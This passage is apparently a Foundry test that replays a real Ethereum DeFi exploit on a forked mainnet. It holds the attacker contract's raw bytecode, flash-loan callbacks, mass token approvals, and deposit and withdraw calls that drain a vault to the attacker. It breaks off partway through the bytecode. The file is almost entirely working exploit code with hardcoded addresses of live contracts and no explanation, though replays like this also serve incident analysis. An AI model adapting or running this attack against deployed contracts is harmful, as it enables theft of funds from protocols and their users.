// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
// https://etherscan.io/address/0x14c19962E4A899F29B3dD9FF52eBFb5e4cb9A067

struct S2 {
    address p1;
    address p2;
    uint24 p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint160 p7;
}

struct S1 {
    bytes p1;
    address p2;
    uint256 p3;
    uint256 p4;
}

interface I {
    function viewDeposit(uint256) external payable;
    function flash(address, uint256, uint256, bytes memory) external payable;
    function approve(address, uint256) external payable;
    function withdraw(uint256, uint256) external payable;
    function transfer(address, uint256) external payable;
    function deposit(uint256, uint256) external payable;
    function multicall(uint256, bytes[] memory) external payable;
    function balanceOf(address) external payable returns (uint256);
}

contract X6cfa is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7");
    }

    address constant x1aba = 0x1aBaEA1f7C830bD89Acc67eC4af516284b1bC33c;
    address constant x2c53 = 0x2C537E5624e4af88A7ae4060C022609376C8D0EB;
    address constant x4616 = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
    address constant x4776 = 0x477658494C3541ba272a7120176D77674a0183Ba;
    address constant x5777 = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x63cb = 0x63cB0F59B7E67c7d4Cb96214ca456597D85c587d;
    address constant x68b3 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address constant x70e8 = 0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96;
    address constant x764a = 0x764a5A29f982D3513e76fe07dF2034821fBdba72;
    address constant x9a6c = 0x9A6C7aE10eB82A0d7dC3C296eCbc2E2bDC53E80B;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xc085 = 0xC08512927D12348F6620a698105e1BAac6EcD911;
    address constant xcadc = 0xcaDC0acd4B445166f12d2C07EAc6E2544FbE2Eef;
    address constant xcf3c = 0xcF3c8f51DE189C8d5382713B716B133e485b99b7;
    address constant xda44 = 0xDa446fAd08277B4D2591536F204E018f32B6831c;
    address constant xe558 = 0xE558f01FCb39B11B2000D11e9a18DcF105f78964;
    address constant xebf2 = 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52;
    address constant xf3d7 = 0xF3d7AA346965656E7c65FB4135531e0C2270AF83;

    uint256 t_x06853c3a = 0;
    uint256 t_uniswapV3FlashCallback = 0;
    uint256 t_flashCallback = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 15941703); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x4a3dd10795e8dd0955b87f9a5b740dae3d160cd27bd448f889aa3465412b0f54));

        // https://explorer.phalcon.xyz/tx/eth/0x4a3dd10795e8dd0955b87f9a5b740dae3d160cd27bd448f889aa3465412b0f54
        this.x4a3dd107();
        // https://explorer.phalcon.xyz/tx/eth/0x4668d653d21ccb5440e43a242d0f60abaa976a46a6c49b21da879d12bba4d4fb
        this.x4668d653();
        // https://explorer.phalcon.xyz/tx/eth/0x390def749b71f516d8bf4329a4cb07bb3568a3627c25e607556621182a17f1f9
        this.x390def74();
        // https://explorer.phalcon.xyz/tx/eth/0x31b25bdbb7ca34ab52d56035e179a4dfc9fd7bafeaecc065580a982c252bc4db
        this.x31b25bdb();
        // https://explorer.phalcon.xyz/tx/eth/0x14541f80c70fbb2f9d8e6013e7f059fb4dcf1566a652ecaa599d0df856068247
        this.x14541f80();
        // https://explorer.phalcon.xyz/tx/eth/0x657c395c21abfc431253944512495b8c1d08a9f53de1d2c5d89cd7c7c06b55f4
        this.x657c395c();
        // https://explorer.phalcon.xyz/tx/eth/0x4f1259815776fa5da75792052247f00f2ce693085e185fde348e3ba9ae5ae988
        this.x4f125981();
        // https://explorer.phalcon.xyz/tx/eth/0x8152df2874901fdbb82dd3750bc02f65437c09fd9634ce2555729f6841d31bf8
        this.x8152df28();
        // https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
        xb727281f();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 15941646); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x4a3dd10795e8dd0955b87f9a5b740dae3d160cd27bd448f889aa3465412b0f54
        this.x4a3dd107();
        vm.warp(1668107843);
        vm.roll(15941650);
        // https://explorer.phalcon.xyz/tx/eth/0x4668d653d21ccb5440e43a242d0f60abaa976a46a6c49b21da879d12bba4d4fb
        this.x4668d653();
        vm.warp(1668108119);
        vm.roll(15941673);
        // https://explorer.phalcon.xyz/tx/eth/0x390def749b71f516d8bf4329a4cb07bb3568a3627c25e607556621182a17f1f9
        this.x390def74();
        vm.warp(1668108227);
        vm.roll(15941682);
        // https://explorer.phalcon.xyz/tx/eth/0x31b25bdbb7ca34ab52d56035e179a4dfc9fd7bafeaecc065580a982c252bc4db
        this.x31b25bdb();
        vm.warp(1668108275);
        vm.roll(15941686);
        // https://explorer.phalcon.xyz/tx/eth/0x14541f80c70fbb2f9d8e6013e7f059fb4dcf1566a652ecaa599d0df856068247
        this.x14541f80();
        vm.warp(1668108299);
        vm.roll(15941688);
        // https://explorer.phalcon.xyz/tx/eth/0x657c395c21abfc431253944512495b8c1d08a9f53de1d2c5d89cd7c7c06b55f4
        this.x657c395c();
        vm.warp(1668108347);
        vm.roll(15941692);
        // https://explorer.phalcon.xyz/tx/eth/0x4f1259815776fa5da75792052247f00f2ce693085e185fde348e3ba9ae5ae988
        this.x4f125981();
        vm.warp(1668108407);
        vm.roll(15941697);
        // https://explorer.phalcon.xyz/tx/eth/0x8152df2874901fdbb82dd3750bc02f65437c09fd9634ce2555729f6841d31bf8
        this.x8152df28();
        vm.warp(1668108479);
        vm.roll(15941703);
        // https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
        xb727281f();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 15941703); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1668108479);
        vm.roll(15941704);
        // https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x1aBaEA1f7C830bD89Acc67eC4af516284b1bC33c),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x2C537E5624e4af88A7ae4060C022609376C8D0EB),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x46161158b1947D9149E066d6d31AF1283b2d377C),
            keccak256(abi.encode(RECEIVER, uint256(8))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96),
            keccak256(abi.encode(RECEIVER, uint256(7))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC08512927D12348F6620a698105e1BAac6EcD911),
            keccak256(abi.encode(RECEIVER, uint256(51))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xcaDC0acd4B445166f12d2C07EAc6E2544FbE2Eef),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xDa446fAd08277B4D2591536F204E018f32B6831c),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52),
            keccak256(abi.encode(RECEIVER, uint256(7))),
            bytes32(uint256(1000000000000000000000000))
        );
        xb727281f();
    }

    function x4f125981() public {
        bytes memory b01 =
            hex"b858183f0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000a0ffab5f80240000000000000000000000000000000000000000000000007b4b5304f4682d300000000000000000000000000000000000000000000000000000000000000042ebf2096e01455108badcbaf86ce30b6e5a72aa520001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000";
        bytes memory b02 =
            hex"04e45aaf000000000000000000000000ebf2096e01455108badcbaf86ce30b6e5a72aa52000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000bb800000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000283fead7e0090000000000000000000000000000000000000000000000001ee2263b9d9e13ba0000000000000000000000000000000000000000000000000000000000000000";
        bytes memory b03 =
            hex"49404b7c0000000000000000000000000000000000000000000000009a2d7940920640ea00000000000000000000000014c19962e4a899f29b3dd9ff52ebfb5e4cb9a067";
        bytes[] memory arr01 = new bytes[](3);
        arr01[0] = b01;
        arr01[1] = b02;
        arr01[2] = b03;
        I(x68b3).multicall(1668110123, arr01);
    }

    function xb727281f() public {
        I(x4616).viewDeposit(200000000000000000000000);
        I(x4616).flash(r, 2311627906953628, 99400000000, hex"307863616c6c666c617368");
        // uint256 v1 = 387023837944937266146579;
        uint256 v1 = I(x4616).balanceOf(r);
        console2.log("I(x4616).balanceOf(r)\t\t->", "387023837944937266146579 (387023.8379 ether)");
        I(x4616).withdraw(v1, 16666017386600);
    }

    function x390def74() public {
        r.call(abi.encodeWithSelector(0xf1f3a66a, 200000000000000000000000, 5));
    }

    function x8152df28() public {
        I(xebf2).transfer(r, 2050000000000000);
    }

    function x14541f80() public {
        r.call(abi.encodeWithSelector(0x06853c3a, xebf2, 100000000000000000));
    }

    function x657c395c() public {
        I(xebf2).approve(x68b3, type(uint256).max);
    }

    function x4668d653() public {
        X6cfa(payable(r)).app();
    }

    function x4a3dd107() public {
        _constructor_();
    }

    function x31b25bdb() public {
        r.call(abi.encodeWithSelector(0x06853c3a, xebf2, 1000000000));
    }

    function x06853c3a() public {
        t_x06853c3a++;

        if (t_x06853c3a == 1) {
            // uint256 v1 = 2271274940334125;
            uint256 v1 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", "2271274940334125 (0.2271 ether)");
            I(xebf2).transfer(tx.origin, 1000000000);
            return;
        }
        if (t_x06853c3a == 2) {
            // uint256 v1 = 2271273940334125;
            uint256 v1 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", "2271273940334125 (0.2271 ether)");
            // uint256 v2 = 2271273940334125;
            uint256 v2 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", "2271273940334125 (0.2271 ether)");
            I(xebf2).transfer(tx.origin, v2);
            return;
        }
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes memory) public {
        t_uniswapV3FlashCallback++;

        if (t_uniswapV3FlashCallback == 1) {
            // uint256 v1 = 100000000000;
            uint256 v1 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(100000000000));
            // uint256 v2 = 0;
            uint256 v2 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", uint256(0));
            I(xe558).flash(r, 0, 2325581395325581, hex"307863616c6c666c617368");
            // uint256 v3 = 99398834232;
            uint256 v3 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(99398834232));
            return;
        }
        if (t_uniswapV3FlashCallback == 2) {
            // uint256 v1 = 100000000000;
            uint256 v1 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(100000000000));
            // uint256 v2 = 2325581395325581;
            uint256 v2 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", "2325581395325581 (0.2325 ether)");
            // uint256 v3 = 100000000000;
            uint256 v3 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(100000000000));
            // uint256 v4 = 2325581395325581;
            uint256 v4 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", "2325581395325581 (0.2325 ether)");
            I(x4616).flash(r, 2313953488348954, 99500000000, hex"307863616c6c666c617368");
            // uint256 v5 = 300886541899570004966586;
            uint256 v5 = I(x4616).balanceOf(r);
            console2.log("I(x4616).balanceOf(r)\t\t->", "300886541899570004966586 (300886.5418 ether)");
            I(x4616).withdraw(v5, 16666017386600);
            I(xa0b8).transfer(x5777, 100010000000);
            I(xebf2).transfer(xe558, 2326744186023244);
            // uint256 v6 = 99398834232;
            uint256 v6 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(99398834232));
            // uint256 v7 = 2271274940334125;
            uint256 v7 = I(xebf2).balanceOf(r);
            console2.log("I(xebf2).balanceOf(r)\t\t->", "2271274940334125 (0.2271 ether)");
            return;
        }
    }

    function app() public {
        I(xebf2).approve(x4616, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(x4616, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(x63cb, 7100000000000000000000000000000000000000000);
        I(xc085).approve(x63cb, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(xcf3c, 7100000000000000000000000000000000000000000);
        I(x2c53).approve(xcf3c, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(x764a, 7100000000000000000000000000000000000000000);
        I(xda44).approve(x764a, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(x9a6c, 7100000000000000000000000000000000000000000);
        I(x70e8).approve(x9a6c, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(x4776, 7100000000000000000000000000000000000000000);
        I(x1aba).approve(x4776, 7100000000000000000000000000000000000000000);
        I(xa0b8).approve(xf3d7, 7100000000000000000000000000000000000000000);
        I(xcadc).approve(xf3d7, 7100000000000000000000000000000000000000000);
    }

    function xf1f3a66a() public {
        I(x4616).viewDeposit(200000000000000000000000);
        I(x5777).flash(r, 0, 100000000000, hex"307863616c6c666c617368");
    }

    function flashCallback(uint256, uint256, bytes memory) public {
        t_flashCallback++;

        if (t_flashCallback == 1) {
            I(x4616).deposit(200000000000000000000000, 16666017386600);
            return;
        }
        if (t_flashCallback == 2) {
            I(x4616).deposit(200000000000000000000000, 16666017386600);
            return;
        }
    }

    function _constructor_() public {
        bytes memory rt = abi.encodePacked(
            hex"608060405234801561001057600080fd5b50600436106101155760003560e01c",
            hex"80637c1d54db116100a2578063b727281f11610071578063b727281f14610286",
            hex"578063b76564bd146102a2578063c3924ed6146102ac578063e9cbafb0146102",
            hex"c8578063f1f3a66a146102e457610115565b80637c1d54db1461021657806399",
            hex"ccb37214610232578063a799046c1461024e578063b376e6651461026a576101",
            hex"15565b80630f3a8e57116100e95780630f3a8e571461018a578063282690ca14",
            hex"6101a65780633b12ffc3146101c257806344b5406b146101de57806355a1db9a",
            hex"146101fa57610115565b8062fba4231461011a57806306853c3a146101365780",
            hex"6307248621146101525780630be06bea1461016e575b600080fd5b6101346004",
            hex"80360381019061012f9190613ad6565b610300565b005b610150600480360381",
            hex"019061014b91906139e0565b6104b5565b005b61016c60048036038101906101",
            hex"679190613ad6565b6106ae565b005b6101886004803603810190610183919061",
            hex"3ad6565b610938565b005b6101a4600480360381019061019f9190613ad6565b",
            hex"610bc2565b005b6101c060048036038101906101bb9190613ad6565b610d7756",
            hex"5b005b6101dc60048036038101906101d79190613ad6565b611001565b005b61",
            hex"01f860048036038101906101f39190613ad6565b6111b6565b005b6102146004",
            hex"80360381019061020f9190613ad6565b61136b565b005b610230600480360381",
            hex"019061022b9190613ad6565b6115f5565b005b61024c60048036038101906102",
            hex"479190613ad6565b61187f565b005b6102686004803603810190610263919061",
            hex"3ad6565b611b09565b005b610284600480360381019061027f9190613ad6565b",
            hex"611cbe565b005b6102a0600480360381019061029b9190613ad6565b611e7356",
            hex"5b005b6102aa611fd4565b005b6102c660048036038101906102c19190613b16",
            hex"565b612b9a565b005b6102e260048036038101906102dd9190613b16565b612c",
            hex"35565b005b6102fe60048036038101906102f99190613ad6565b6132e6565b00",
            hex"5b7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffffffff",
            hex"ffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffff",
            hex"ffff161461034c57600080fd5b816005819055508060098190555073f3d7aa34",
            hex"6965656e7c65fb4135531e0c2270af836000806101000a81548173ffffffffff",
            hex"ffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffff",
            hex"ffffffffffffffffff16021790555060008060009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff16636f2ef95b6005546040518263ffffffff1660e01b8152",
            hex"60040161040c9190613f2b565b60006040518083038186803b15801561042457",
            hex"600080fd5b505afa158015610438573d6000803e3d6000fd5b50505050604051",
            hex"3d6000823e3d601f19601f820116820180604052508101906104619190613a7a",
            hex"565b915050806001815181106104785761047761423a565b5b60200260200101",
            hex"516006819055508060008151811061049a5761049961423a565b5b6020026020",
            hex"0101516007819055506104b06134d3565b505050565b7314c19962e4a899f29b",
            hex"3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffffffffff",
            hex"163373ffffffffffffffffffffffffffffffffffffffff161461050157600080",
            hex"fd5b8173ffffffffffffffffffffffffffffffffffffffff166370a082313060",
            hex"40518263ffffffff1660e01b815260040161053a9190613cb1565b6020604051",
            hex"8083038186803b15801561055257600080fd5b505afa158015610566573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"9061058a9190613a4d565b811061061c578173ffffffffffffffffffffffffff",
            hex"ffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401",
            hex"6105c99190613cb1565b60206040518083038186803b1580156105e157600080",
            hex"fd5b505afa1580156105f5573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f820116820180604052508101906106199190613a4d565b90505b8173ff",
            hex"ffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363",
            hex"ffffffff1660e01b8152600401610657929190613e38565b6020604051808303",
            hex"81600087803b15801561067157600080fd5b505af1158015610685573d600080",
            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
            hex"6106a99190613a20565b505050565b7314c19962e4a899f29b3dd9ff52ebfb5e",
            hex"4cb9a06773ffffffffffffffffffffffffffffffffffffffff163373ffffffff",
            hex"ffffffffffffffffffffffffffffffff16146106fa57600080fd5b8160058190",
            hex"55508060098190555073f3d7aa346965656e7c65fb4135531e0c2270af836000",
            hex"806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916",
            hex"908373ffffffffffffffffffffffffffffffffffffffff160217905550600080",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff16636f2ef95b60055460",
            hex"40518263ffffffff1660e01b81526004016107ba9190613f2b565b6000604051",
            hex"8083038186803b1580156107d257600080fd5b505afa1580156107e6573d6000",
            hex"803e3d6000fd5b505050506040513d6000823e3d601f19601f82011682018060",
            hex"40525081019061080f9190613a7a565b91505060008054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff16630b2583c8600260009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673cadc0acd4b445166f12d2c07ea",
            hex"c6e2544fbe2eef6404a817c8006000650f285c0bd0686040518663ffffffff16",
            hex"60e01b81526004016108b5959493929190613d1f565b60006040518083038160",
            hex"0087803b1580156108cf57600080fd5b505af11580156108e3573d6000803e3d",
            hex"6000fd5b50505050806001815181106108fb576108fa61423a565b5b60200260",
            hex"200101516006819055508060008151811061091d5761091c61423a565b5b6020",
            hex"0260200101516007819055506109336134d3565b505050565b7314c19962e4a8",
            hex"99f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffff",
            hex"ffffff163373ffffffffffffffffffffffffffffffffffffffff161461098457",
            hex"600080fd5b816005819055508060098190555073477658494c3541ba272a7120",
            hex"176d77674a0183ba6000806101000a81548173ffffffffffffffffffffffffff",
            hex"ffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffff",
            hex"ff16021790555060008060009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"16636f2ef95b6005546040518263ffffffff1660e01b8152600401610a449190",
            hex"613f2b565b60006040518083038186803b158015610a5c57600080fd5b505afa",
            hex"158015610a70573d6000803e3d6000fd5b505050506040513d6000823e3d601f",
            hex"19601f82011682018060405250810190610a999190613a7a565b915050600080",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff16630b2583c860026000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff16731abaea",
            hex"1f7c830bd89acc67ec4af516284b1bc33c6409502f90006000650f285c0bd068",
            hex"6040518663ffffffff1660e01b8152600401610b3f959493929190613d72565b",
            hex"600060405180830381600087803b158015610b5957600080fd5b505af1158015",
            hex"610b6d573d6000803e3d6000fd5b5050505080600181518110610b8557610b84",
            hex"61423a565b5b602002602001015160068190555080600081518110610ba75761",
            hex"0ba661423a565b5b6020026020010151600781905550610bbd6134d3565b5050",
            hex"50565b7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffff",
            hex"ffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffff",
            hex"ffffffff1614610c0e57600080fd5b816005819055508060098190555073764a",
            hex"5a29f982d3513e76fe07df2034821fbdba726000806101000a81548173ffffff",
            hex"ffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffff",
            hex"ffffffffffffffffffffff16021790555060008060009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
            hex"ffffffffffffffffffff16636f2ef95b6005546040518263ffffffff1660e01b",
            hex"8152600401610cce9190613f2b565b60006040518083038186803b158015610c",
            hex"e657600080fd5b505afa158015610cfa573d6000803e3d6000fd5b5050505060",
            hex"40513d6000823e3d601f19601f82011682018060405250810190610d23919061",
            hex"3a7a565b91505080600181518110610d3a57610d3961423a565b5b6020026020",
            hex"01015160068190555080600081518110610d5c57610d5b61423a565b5b602002",
            hex"6020010151600781905550610d726134d3565b505050565b7314c19962e4a899",
            hex"f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffffff",
            hex"ffff163373ffffffffffffffffffffffffffffffffffffffff1614610dc35760",
            hex"0080fd5b816005819055508060098190555073764a5a29f982d3513e76fe07df",
            hex"2034821fbdba726000806101000a81548173ffffffffffffffffffffffffffff",
            hex"ffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff",
            hex"16021790555060008060009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"636f2ef95b6005546040518263ffffffff1660e01b8152600401610e83919061",
            hex"3f2b565b60006040518083038186803b158015610e9b57600080fd5b505afa15",
            hex"8015610eaf573d6000803e3d6000fd5b505050506040513d6000823e3d601f19",
            hex"601f82011682018060405250810190610ed89190613a7a565b91505060008054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff16630b2583c86002600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673da446fad",
            hex"08277b4d2591536f204e018f32b6831c6409502f90006000650f285c0bd06860",
            hex"40518663ffffffff1660e01b8152600401610f7e959493929190613d72565b60",
            hex"0060405180830381600087803b158015610f9857600080fd5b505af115801561",
            hex"0fac573d6000803e3d6000fd5b5050505080600181518110610fc457610fc361",
            hex"423a565b5b602002602001015160068190555080600081518110610fe657610f",
            hex"e561423a565b5b6020026020010151600781905550610ffc6134d3565b505050",
            hex"565b7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffffff",
            hex"ffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffff",
            hex"ffffff161461104d57600080fd5b81600581905550806009819055507363cb0f",
            hex"59b7e67c7d4cb96214ca456597d85c587d6000806101000a81548173ffffffff",
            hex"ffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffff",
            hex"ffffffffffffffffffff16021790555060008060009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff16636f2ef95b6005546040518263ffffffff1660e01b81",
            hex"5260040161110d9190613f2b565b60006040518083038186803b158015611125",
            hex"57600080fd5b505afa158015611139573d6000803e3d6000fd5b505050506040",
            hex"513d6000823e3d601f19601f820116820180604052508101906111629190613a",
            hex"7a565b915050806001815181106111795761117861423a565b5b602002602001",
            hex"01516006819055508060008151811061119b5761119a61423a565b5b60200260",
            hex"200101516007819055506111b16134d3565b505050565b7314c19962e4a899f2",
            hex"9b3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffffffff",
            hex"ff163373ffffffffffffffffffffffffffffffffffffffff1614611202576000",
            hex"80fd5b8160058190555080600981905550739a6c7ae10eb82a0d7dc3c296ecbc",
            hex"2e2bdc53e80b6000806101000a81548173ffffffffffffffffffffffffffffff",
            hex"ffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16",
            hex"021790555060008060009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663",
            hex"6f2ef95b6005546040518263ffffffff1660e01b81526004016112c29190613f",
            hex"2b565b60006040518083038186803b1580156112da57600080fd5b505afa1580",
            hex"156112ee573d6000803e3d6000fd5b505050506040513d6000823e3d601f1960",
            hex"1f820116820180604052508101906113179190613a7a565b9150508060018151",
            hex"811061132e5761132d61423a565b5b6020026020010151600681905550806000",
            hex"815181106113505761134f61423a565b5b602002602001015160078190555061",
            hex"13666134d3565b505050565b7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a0",
            hex"6773ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffff",
            hex"ffffffffffffffffffffffffff16146113b757600080fd5b8160058190555080",
            hex"600981905550739a6c7ae10eb82a0d7dc3c296ecbc2e2bdc53e80b6000806101",
            hex"000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373",
            hex"ffffffffffffffffffffffffffffffffffffffff160217905550600080600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff16636f2ef95b60055460405182",
            hex"63ffffffff1660e01b81526004016114779190613f2b565b6000604051808303",
            hex"8186803b15801561148f57600080fd5b505afa1580156114a3573d6000803e3d",
            hex"6000fd5b505050506040513d6000823e3d601f19601f82011682018060405250",
            hex"8101906114cc9190613a7a565b91505060008054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff16630b2583c8600260009054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff167370e8de73ce538da2beed35d14187f695",
            hex"9a8eca966402540be4006000650f285c0bd0686040518663ffffffff1660e01b",
            hex"8152600401611572959493929190613ccc565b60006040518083038160008780",
            hex"3b15801561158c57600080fd5b505af11580156115a0573d6000803e3d6000fd",
            hex"5b50505050806001815181106115b8576115b761423a565b5b60200260200101",
            hex"51600681905550806000815181106115da576115d961423a565b5b6020026020",
            hex"0101516007819055506115f06134d3565b505050565b7314c19962e4a899f29b",
            hex"3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffffffffff",
            hex"163373ffffffffffffffffffffffffffffffffffffffff161461164157600080",
            hex"fd5b816005819055508060098190555073cf3c8f51de189c8d5382713b716b13",
            hex"3e485b99b76000806101000a81548173ffffffffffffffffffffffffffffffff",
            hex"ffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602",
            hex"1790555060008060009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636f",
            hex"2ef95b6005546040518263ffffffff1660e01b81526004016117019190613f2b",
            hex"565b60006040518083038186803b15801561171957600080fd5b505afa158015",
            hex"61172d573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f",
            hex"820116820180604052508101906117569190613a7a565b915050600080549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffff",
            hex"ffffffffffffffffffffffffffffffff16630b2583c860026000905490610100",
            hex"0a900473ffffffffffffffffffffffffffffffffffffffff16732c537e5624e4",
            hex"af88a7ae4060c022609376c8d0eb6409502f90006000650f285c0bd068604051",
            hex"8663ffffffff1660e01b81526004016117fc959493929190613d72565b600060",
            hex"405180830381600087803b15801561181657600080fd5b505af115801561182a",
            hex"573d6000803e3d6000fd5b50505050806001815181106118425761184161423a",
            hex"565b5b6020026020010151600681905550806000815181106118645761186361",
            hex"423a565b5b602002602001015160078190555061187a6134d3565b505050565b",
            hex"7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffff",
